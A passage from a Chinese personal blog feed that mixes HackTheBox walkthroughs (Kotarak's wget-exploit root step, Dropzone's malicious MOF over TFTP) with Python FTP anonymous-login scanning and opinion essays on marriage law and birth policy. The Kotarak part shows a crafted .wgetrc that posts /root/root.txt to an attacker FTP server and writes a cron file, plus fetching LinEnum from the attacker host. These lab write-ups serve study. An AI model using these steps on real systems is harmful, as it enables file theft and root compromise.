~/user.txt</code></p><h2 id="root提权"><a href="#root提权" class="headerlink" title="root提权"></a>root提权</h2><p>kali：<code>python -m SimpleHTTPServer 80</code></p><p>远程shell: </p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">cd /tmp<br>wget http:<span class="hljs-comment">//10.10.14.5:80/LinEnum.sh</span><br>chmod a+x <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LinEnum</span>.</span></span>sh; ./<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LinEnum</span>.</span></span>sh<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/3.PNG" alt="3"></p><p>find . -name “root.txt” 2&gt;/dev/null<br>未找到</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/4.PNG" alt="4"></p><h3 id="线索app-log"><a href="#线索app-log" class="headerlink" title="线索app.log"></a>线索app.log</h3><p>app.log暗示了我们10.0.3.133的wget版本<code>Wget/1.16</code></p><p><code>wget -V</code>，发现主机10.10.10.55的Wget版本为 <code>1.17.1</code></p><p>有一个主机10.0.3.133，每两分钟获取主机10.10.10.55的/archive.tar.gz文件。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> Wget<br><span class="hljs-attribute">GNU</span> Wget &lt; <span class="hljs-number">1</span>.<span class="hljs-number">18</span> - Arbitrary File Upload / Remote Code Execution <br><br><span class="hljs-attribute">searchsploit</span> -m exploits/linux/remote/<span class="hljs-number">40064</span>.txt<br></code></pre></div></td></tr></table></figure><p>查看40064.txt</p><hr><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p><strong>ifconfig</strong></p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">eth0</span> inet addr:<span class="hljs-number">10.10.10.55</span><br>lxcbr0 inet addr:<span class="hljs-number">10.0.3.1</span><br></code></pre></div></td></tr></table></figure><p><code>arp -a</code> 查看本地arp缓存表。<br>显示局域网ip有两个，<code>10.10.10.2</code> <code>10.10.3.133</code><br>shell终端运行nmap，显示不能用。<br>那么用nc来扫描端口：<br><code>nc -v 10.10.3.133 445</code><br><code>nc -v 10.10.3.133 3389</code><br><code>nc -v 10.10.3.133 22</code><br>只有22端口显示succeeded。<br>这一步骤为了确定ip133的是什么机器，显然是linux机器。</p><p>看来我们要提权10.10.3.133的root权限，来获得root.txt</p><h3 id="wget漏洞利用"><a href="#wget漏洞利用" class="headerlink" title="wget漏洞利用"></a>wget漏洞利用</h3><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>当133主机请求10.0.3.1的archive存档文件时候，3.1会提示404不存在。</p><p>如果我们用kali开启ftp服务，并且让3.1重定向到kali-ftp，于是133主机就会取回.wgetrc作为全局初始化配置文件。</p><p>.wgetrc提示发送/root/root.txt，于是133就将本机的机密文件发送给了10.0.3.1</p><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>kali-ip : touch exp.py<br>touch .wgetrc</p><p>.wgetrc文件内容，保存的绝对路径为/root/.wgetrc</p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">post_file = <span class="hljs-regexp">/root/</span>root.txt<br>output_document = <span class="hljs-regexp">/etc/</span>cron.d/wget-root-shell<br></code></pre></div></td></tr></table></figure><blockquote><p>wgetrc是一个全局初始启动的配置文件<br>post-file选项使你选择一个具体的文件发送<br>output_document选项，使下载的文件以你设置的文件名保存</p></blockquote><p>exp.py内容<br><a href="https://raw.githubusercontent.com/Teckk2/Teck_k2/master/Kotarak-wget.py">https://raw.githubusercontent.com/Teckk2/Teck_k2/master/Kotarak-wget.py</a><br>将exp修改ftp的ip为kali的，然后上传至10.10.10.55。</p><p>kali: </p><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">pip2 <span class="hljs-keyword">install</span> pyftpdlib <br>python -m pyftpdlib -p <span class="hljs-number">21</span> -w<br>以路径/root，kali开启ftp服务器<br></code></pre></div></td></tr></table></figure><p>kali上传wget.py到远程主机：<br><code>python -m SimpleHTTPServer 8080</code></p><p>远程shell :</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">wget http://<span class="hljs-number">10.10</span>.<span class="hljs-number">14.5</span>:<span class="hljs-number">8080</span>/wget.<span class="hljs-keyword">py</span><br>authbind <span class="hljs-keyword">python</span> wget.<span class="hljs-keyword">py</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/5.PNG" alt="5"></p><p>稍等两分钟，10.10.10.55的shell就会返回执行结果，成功获得10.10.3.133的/root/root.txt文件。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/6.PNG" alt="6"></p><p>如果将.wgetrc文件进行修改，即可获得任意10.10.3.133的文件，包括/etc/shadow。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料:"></a>参考资料:</h3><p><a href="https://www.hackingarticles.in/3-ways-extract-password-hashes-from-ntds-dit/">从ntds-dit提取密码的三种方式</a></p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从中国与日本的女性地位谈婚姻</title>
    <link href="/2019/05/17/04-x/"/>
    <url>/2019/05/17/04-x/</url>
    
    <content type="html"><![CDATA[<p>首先要感谢毛爷爷，当时宣传“妇女能顶半边天”。</p><p>今年新婚姻法出台，2019年新婚姻法摘录某些段落如下：</p><figure class="highlight gcode"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gcode">新婚姻法明确规定下列情形之一的，为夫妻一方的财产：<br><br><span class="hljs-comment">(一)</span>一方所有的婚前财产;<br><br><span class="hljs-comment">(二)</span>因一方身体受到伤害获得的医疗费、残疾人生活补助费等费用;<br><br><span class="hljs-comment">(三)</span>遗嘱或赠与合同中指明归一方的财产;<br><br><span class="hljs-comment">(四)</span>一方专用的生活用品;<br><br><span class="hljs-comment">(五)</span>其他应当归一方的财产。<br><br>新婚姻法首次提出离婚时，一方因抚育子女、照料老人、协助另一方工作等付出较多义务的，可以向另一方请求补偿。<br></code></pre></div></td></tr></table></figure><p>这是一个平等的法律，但平等并不意味着公正。</p><p>我有一个好友，他的母亲在新婚姻法出台前年离婚了，而家产分一半，包括现金、房产。他的母亲长的很漂亮、文化水平不高，他父亲把所有工资都交到母亲手里，然后追到了他妈。</p><p>他父亲说可以养她，于是他母亲就当了家庭主妇，年老了就被离婚了。在长达20年的婚姻中，他妈负责做饭、洗碗、洗衣服、打扫房间、陪睡、生孩子，他爸负责赚钱。</p><p>如果从现在的婚姻法来看，他妈应该是什么都得不到，得不到孩子的抚养权，四五十岁找不到什么像样的工作，于是去当清洁工、服务员之类的。</p><p>《卫风·氓》中说到</p><figure class="highlight node-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs node-repl">氓之蚩蚩，抱布贸丝。<br>匪来贸丝，来即我谋。<br><span class="hljs-meta">...</span><br>及尔偕老，老使我怨。<br>淇则有岸，隰则有泮。<br>总角之宴，言笑晏晏，<br>信誓旦旦，不思其反。<br>反是不思，亦已焉哉！<br></code></pre></div></td></tr></table></figure><p>从古到今，虽然法律已经保证了男女平等，但男人和女人从生理上就是不平等的，因为女人有生育的能力，男人没有。</p><p>国家开放二胎后，如果女性要生两个小孩，那么至少脱产两三年。而事业和家庭不能兼顾，如果选择了生育，那就放弃了事业，三年中，要操劳婴幼儿的吃喝拉撒，这些劳动都是无偿的。</p><p>因为法律规定了嘛，男女平等。</p><p>于是越来越多的女性开始醒悟过来，为什么要放弃自己的事业来成就家庭呢？法律规定了啊，一方所有的婚前财产，属于一方。刘强东出轨后，奶茶妹妹看着比自己大19岁的丈夫，还能怎么办，笑着原谅他，不然呢？婚前财产属于东哥的，其他的别想了。</p><p>法律不是弱者的保护伞，法律是国家维护阶级统治的工具，是统治阶级意志的体现。</p><p>而法律规定了，男女平等，而且还规定了，企业要负担女性的生育成本：</p><figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf">《女职工劳动保护特别规定》第八条　<br><br>女职工产假期间的生育津贴，对已经参加生育保险的，按照用人单位上年度职工月平均工资的标准由生育保险基金支付<span class="hljs-comment">;</span><br><br>对未参加生育保险的，按照女职工产假前工资的标准由用人单位支付。<br></code></pre></div></td></tr></table></figure><p>根据《劳动法》第29条规定：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">女职工在孕期、产期、哺乳期内的，用人单位不得解除劳动合同。这里的“用人单位”，包括国家机关，企业、事业、社会团体等一切雇佣人员的单位。怀孕的女职工不仅在劳动合同的聘用期内不得解除合同，就是在劳动合同期满后，也有继续签劳动合同的权利。<br></code></pre></div></td></tr></table></figure><p>企业能怎么办？不雇佣女性呗…</p><h2 id="李开复的自传"><a href="#李开复的自传" class="headerlink" title="李开复的自传"></a>李开复的自传</h2><p>在给外甥证婚的时候，李开复总结自己的婚姻：</p><blockquote><p>成功的婚姻不是建立在安全、拥有的基础之上，而是建立在平等、自由之上。婚姻不是在制造罪恶感的义务，而是彼此互补，彼此互谅，彼此互相扶持的过程。与自己最爱的人共度生命之旅，分享权力，分担责任，才能沐浴在光辉中。</p></blockquote><p>听起来是不是很感动？在他的书中，他这样写道</p><blockquote><p>交往过程中,我发现她除了可爱、纯洁,还是一位罕见的传统中国女性。为了家,她心甘情愿地付出一切。每天一大早起来,她抢先把家务做了,扫地、买菜,生怕她年迈的外婆和身体不好的母亲劳累。为人处世,她总是燃烧自己,照亮别人。这一切都深深地感动了我。</p></blockquote><blockquote><p>我清了清嗓音,对着电话说:<br>“我知道,这样的<br>求婚对你来说有点突然,我们的年龄也比较小。但是我已经认定你了,我相信你也认定我了。所以,”<br>我顿了顿说，“你愿意嫁给我,让我成为世界上最快乐的男人吗?”</p></blockquote><blockquote><p>现在有些年轻人得知我一辈子只有一份感情，或者说第一次恋爱就结婚了,感到十分不可思议。<br>尤其是我在 21 岁就组成了家庭,感到有点震惊。其实,对于我来说,正是因为有了稳定的感情依靠,使得我在美国读博士期间,不再感觉到孤独,也让我有了心无旁骛、全力以赴做科技研发的动力。</p></blockquote><blockquote><p>妻子这 25 年来任劳任怨,相夫教子,对家庭付出极多。对她的家人,她总是充满着爱心,永无止境地奉献,无论是每天六点起来为全家榨新鲜果汁,还是亲手缝衣服和被子,或者是把衣服烫得笔挺。</p></blockquote><p>一个传统男性遇到了一个传统女性，未尝不是一个美满的结局。</p><p>李开复是一个美籍华人，几十年后的今天，在中国这片普遍贫穷的大地上，因为生育的成本，导致生育率不到1.0，这片土地上的所有人都会为养老金、劳动力不足、经济衰退付出代价。</p><p>然而，现当代，传统女性显然没有了退路。将自己的生活寄托在别人身上无疑是不明智的。</p><p><strong>在有生之年，当代生育政策必定会由打击转向鼓励生育。可惜为时已晚。</strong></p><p>生育率一旦降下去，再上来就难了，现在的国家还没有几个能做到的。</p><p>在日本，女性被期望做一个辅助者。因为低生育率的原因，女性被期望多生育，日本女性的家庭地位过高，职场地位太低。在家庭模式为easy，职场地位为hard。所以有不少女性选择做家庭主妇。</p><hr><p>日本从进入老龄化后，各大公司减少正式员工的名额，导致年轻人收入降低。</p><p>话语权普遍掌握在老年人手中。</p><p>众所周知，日本是个等级制度非常严厉的国家，年纪比你大的人，你就必须要尊敬。职位升迁更多的是按部就班、熬年头，非常年轻的上级是很罕见的。</p><p>有一条新闻“日本网络安全部部长从未使用过电脑”，说明了这一点。</p><hr><p>中日韩三国经济内卷化，即内部竞争过大，所以生育率是有目共睹的。</p><ul><li>资本倾向于有钱人</li><li>信息不对称</li><li>生产率提高，一般劳动力的价值越来越低</li><li>消费主义横行，穷人不会攒钱</li><li>穷人的时间也能榨取利润</li></ul><p>以上原因导致贫富差距越来越大，但是富人还是很想生育的——“日本富二代泰国代孕1000个孩子”</p><p>综上所述，原因还是资本主义的劣根性导致的。穷人逐渐绝育，这就是正在发生的事实。</p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell-script（四） range-scan.sh</title>
    <link href="/2019/05/17/09-x/"/>
    <url>/2019/05/17/09-x/</url>
    
    <content type="html"><![CDATA[<p><a href="https://whale3070.github.io/linux/2019/03/21/08-x/">上一篇</a></p><p>修改shell script，目的是扫描过程显得更专业、美观；并且添加一个不扫描的IP列表（例如我们已经获得root的IP列表）</p><p>参考资料：github “onetwopunch.sh”</p><hr><p>range-scan.sh脚本源代码下载地址：<br><a href="https://raw.githubusercontent.com/Whale3070/ctf-coding/master/range-scan.sh">https://raw.githubusercontent.com/Whale3070/ctf-coding/master/range-scan.sh</a></p><h2 id="shell-script’s-function"><a href="#shell-script’s-function" class="headerlink" title="shell script’s function"></a>shell script’s function</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> banner &#123;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  &quot;</span>   <br>&#125;<br><br>banner                     <br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-17-09/8.PNG" alt="8"></p><h2 id="unscan-ip-range"><a href="#unscan-ip-range" class="headerlink" title="unscan-ip range"></a>unscan-ip range</h2><p><code>python clear-ip.py #del the ip which not want scan</code><br>在上述脚本中，添加了一行，调用python脚本clear-ip.py</p><p>下载地址如下：<br><a href="https://raw.githubusercontent.com/Whale3070/ctf-coding/master/clear-ip.py">https://raw.githubusercontent.com/Whale3070/ctf-coding/master/clear-ip.py</a></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python扫描-ftp匿名登陆</title>
    <link href="/2019/05/17/11-x/"/>
    <url>/2019/05/17/11-x/</url>
    
    <content type="html"><![CDATA[<p>参考书籍：《Foundations of Python Network Programming 2nd》Page294</p><hr><h2 id="案例一，下载user-txt"><a href="#案例一，下载user-txt" class="headerlink" title="案例一，下载user.txt"></a>案例一，下载user.txt</h2><p>在hackthebox中，用python代码下载位于10.10.10.152的ftp端口上的user.txt文件。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-17-11/1.PNG" alt="1"></p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-meta">#ascii download</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> ftplib <span class="hljs-keyword">import</span> FTP<br><br><span class="hljs-keyword">if</span> os.path.<span class="hljs-keyword">exists</span>(<span class="hljs-string">&#x27;user.txt&#x27;</span>):<br><span class="hljs-keyword">raise</span> IOError(<span class="hljs-string">&#x27;refusing to overwrite your user.txt&#x27;</span>)<br><br>def writeline(data):<br>fd.<span class="hljs-keyword">write</span>(data)<br>fd.<span class="hljs-keyword">write</span>(os.linesep)<br><br>f = FTP(<span class="hljs-string">&#x27;10.10.10.152&#x27;</span>) #远程IP<br>f.<span class="hljs-keyword">login</span>()              <br>f.cwd(<span class="hljs-string">&#x27;/Users/Public&#x27;</span>) #切换远程系统上的工作目录<br><br>fd = <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;user.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>f.retrlines(<span class="hljs-string">&#x27;RETR user.txt&#x27;</span>, writeline) #开始传输<br>fd.<span class="hljs-keyword">close</span>()<br>f.quit()<br></code></pre></div></td></tr></table></figure><h2 id="案例二，扫描开放21端口的主机。"><a href="#案例二，扫描开放21端口的主机。" class="headerlink" title="案例二，扫描开放21端口的主机。"></a>案例二，扫描开放21端口的主机。</h2><p>通过这个<a href="https://whale3070.github.io/linux/2019/05/17/09-x/">脚本</a>，我们获得了40个主机的端口扫描结果。</p><p>接下来，用python自动连接开放21端口的主机。</p><p>grep ‘21/tcp’ */nmap-result &gt; test/result<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-17-11/2.PNG" alt="2"></p><p>将ip写入ip.txt</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#if anonymous can login </span><br><span class="hljs-keyword">from</span> ftplib <span class="hljs-keyword">import</span> FTP,error_perm<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">try_login</span>(<span class="hljs-params">IP</span>):</span><br>f=FTP(IP)<br><span class="hljs-keyword">try</span>:<br>f.login()<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Current working directory:&quot;</span>, f.pwd()<br>f.quit()<br><span class="hljs-keyword">except</span> error_perm:<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;error&#x27;</span><br><span class="hljs-keyword">return</span> <span class="hljs-comment">#ignore non-directories and ones we cannot enter</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ip.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>all_ip = f.read().splitlines()<br><span class="hljs-built_in">print</span> all_ip<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> all_ip:<br><span class="hljs-built_in">print</span> i<br>try_login(i)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;-----------&#x27;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-17-11/3.PNG" alt="3"></p><hr><p>修改下try的代码段，列出ip.txt中，可以匿名登陆的ip。</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">f</span>.login()<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Current working directory:&quot;</span>, <span class="hljs-keyword">f</span>.<span class="hljs-keyword">pwd</span>()<br><br>entries = []<br><span class="hljs-keyword">f</span>.dir(entries.<span class="hljs-keyword">append</span>)<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;%d entries:&quot;</span> % <span class="hljs-built_in">len</span>(entries)<br><br><span class="hljs-keyword">for</span> entry in entrie<span class="hljs-variable">s:</span><br><span class="hljs-keyword">print</span> entry<br><span class="hljs-keyword">f</span>.<span class="hljs-keyword">quit</span>()<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-17-11/4.PNG" alt="4"></p>]]></content>
    
    
    <categories>
      
      <category>code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>China should release birth restrictions</title>
    <link href="/2019/05/16/10-x/"/>
    <url>/2019/05/16/10-x/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为选修了“英语演讲的艺术”，所以写了一篇演讲稿，主题是“中国应该放开生育限制”</p><p>实话说，我认为短期内（三、五年之内）并没有可能。和希特勒大屠杀一样，所有执行者都认为自己没有责任，<br>但是那么多犹太人，站着不动让希特勒去杀，他一辈子也杀不完的。</p><p>但是…课程要求嘛，还是写一下，随便发一下。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>As we all know, China has entered an aging society. However, up to now, only one couple are allowed to have two children in China.</p><p>It is generally believed that when a country’s 65-year-old elderly population accounts for 7%, it enters an aging society, with a proportion of 14% entering a deep-aged society and 20% entering a super-aging society.</p><p>In 2018, Liaoning, Shanghai, Shandong, Sichuan, Jiangsu, Chongqing, six provinces or municipalities have reached the stage of deep aging.</p><p>It is expected that China will enter a deep-aging society in 2025. In order to cope with the shortage of labor, taxes and pensions, China should liberalize birth restrictions.</p><p>There is an ancient Chinese prose,”Peacock flying southeast”, which tells a tragic love story. The leading lady Liulanzhi’s mother-in-law is not satisfied, so Liulanzhi must leave her husband and go home. Finally, the Chief actor Jiaozhongqin and his wife Liulanzhi successively committed suicide to rebellion against the society that person who love each other can’t be together. </p><p>In China’s history, it has always been a male-dominated society. Although only women have fertility, the right of marriage has always been in the hands of the father and the older-brother. Women do not have the right to choose marriage and childbearing.</p><p>However, nowadays, if women want to have a child, she must have a pregnancy permit, and the pregnancy permit is linked to a marriage certificate. Women must have the aid of man, can have a child. Fertility behavior of single woman is to be teased by the society, which shows that China does not respect the women’s childbearing right.</p><p>Childbearing right is one of human rights. It is against the constitution to restrict the Fertility behavior by various means. If lesbians and gay men must have a fake marriage to have a child, such a law will force people to have recourse to deception.</p><p>Can such a law be said to be justice?</p><p>Most young people in modern society pay more attention to self-realization, so the current marriage rate and the fertility rate are falling. </p><p>If the marriage and childbearing are forcibly linked as in Japan. The result is obvious. </p><p>In Japan, the lifetime unmarried rate is 23.37% for men and 14.06% for women. Similar to Japan, the result of forcibly link marriage and childbearing will make the cost of marriage extremely huge, leading people unmarried.<br>In 2018, the national marriage rate was 7.2%, which is equivalent to only 7 out of 1,000 people are married. This shows that people’s willingness to marry is gradually decreasing, not to mention childbearing. </p><p>Therefore, in order to improve the fertility rate.</p><p>Let’s make children born without permission can normally register residence. </p><p>Let’s make a friendly social environment to single women.</p><p>This is an urgent task. </p><p>The continuation of strict family planning is nothing but the government’s laziness, the excuses of the corrupt institutions. And strictly combat children born without permission. This is what our government has done in the past and now.</p><p>Japan today is likely to be our tomorrow.</p><p>In summary, China should completely release birth restrictions!</p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dropzone</title>
    <link href="/2019/05/03/04-dropzone/"/>
    <url>/2019/05/03/04-dropzone/</url>
    
    <content type="html"><![CDATA[<h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>用masscan与Nmap工具分别输入以下指令:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">masscan</span> -p<span class="hljs-number">1</span>-<span class="hljs-number">65535</span>,U:<span class="hljs-number">1</span>-<span class="hljs-number">65535</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.x --rate=<span class="hljs-number">1000</span> -e tun<span class="hljs-number">0</span> -p<span class="hljs-number">1</span>-<span class="hljs-number">65535</span>,U:<span class="hljs-number">1</span>-<span class="hljs-number">65535</span> &gt; ports?<br><span class="hljs-attribute">ports</span>=$(cat ports | awk -F <span class="hljs-string">&quot; &quot;</span> &#x27;&#123;print $<span class="hljs-number">4</span>&#125;&#x27; | awk -F <span class="hljs-string">&quot;/&quot;</span> &#x27;&#123;print $<span class="hljs-number">1</span>&#125;&#x27; | sort -n | tr &#x27;\n&#x27; &#x27;,&#x27; | sed &#x27;s/,$//&#x27;)?<br><br><span class="hljs-attribute">nmap</span> -Pn -sV -sC -sU -sT -p$ports <span class="hljs-number">10.10.10.90</span>?<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-04/123-008.png" alt="123-008"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-04/123-009.png" alt="123-009"></p><p>Nmap工具的扫描结果表明UDP 69端口（TFTP）正在运行，这是使用netcat验证的。</p><h2 id="对感兴趣文件的渗透"><a href="#对感兴趣文件的渗透" class="headerlink" title="对感兴趣文件的渗透"></a>对感兴趣文件的渗透</h2><p>（从上述结果看），获得整个系统的读写权限似乎是可行的。由于llisence.rtf文件只有在早于Windows 7的操作系统下才能隐藏，在查看了eula.txt文件后我们可以得知操作系统是 Windows XP Service Pack 3。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-04/123-014.png" alt="123-014"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-04/123-015.png" alt="123-015"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>恶意MOF文件的创建</strong></p><p>根据以前有关Stuxnet Windows Printer Spooler vulnerability (MS10-061)的知识，或通过搜索Windows XP 的写入特权攻击，很可能我们的初始载体需要创建一个恶意MOF文件。</p><p>在Xst3nZ的博客里，他着重讲述了如何将恶意MOF文件变成武器（来发挥作用），很值得一读，我把他的博客原文链接放在下面：<br><a href="http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html">http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html</a></p><p>Metasploit Framework 用恶意MOF文件通过与wbemexec.rb 文件混合来当作某些模块的payloads。相关链接：<a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilegeattack-on-Windows">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilegeattack-on-Windows</a></p><p>wbemexec.rb 按以下的方式进行修改并被执行来生成一个恶意MOF文件，<a href="https://github.com/Whale3070/ctf-coding/blob/master/Dropzone-mof">Dropzone-mof文件下载地址为</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-04/123-020.png" alt="123-020"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-04/123-021.png" alt="123-021"></p><h2 id="TFTP传输与shell"><a href="#TFTP传输与shell" class="headerlink" title="TFTP传输与shell"></a>TFTP传输与shell</h2><p>TFTP 的 binary（二进制）传输模式是可用的，在MOF文件被上传到 “c:\windows\system32\wbem\mof ”之前，该MOF文件需要先上传到“c:\windows\system32”。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-04/123-026.png" alt="123-026"></p><p>一个shell就马上被SYSTEM接收到。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-03-04/123-027.png" alt="123-027"></p><h2 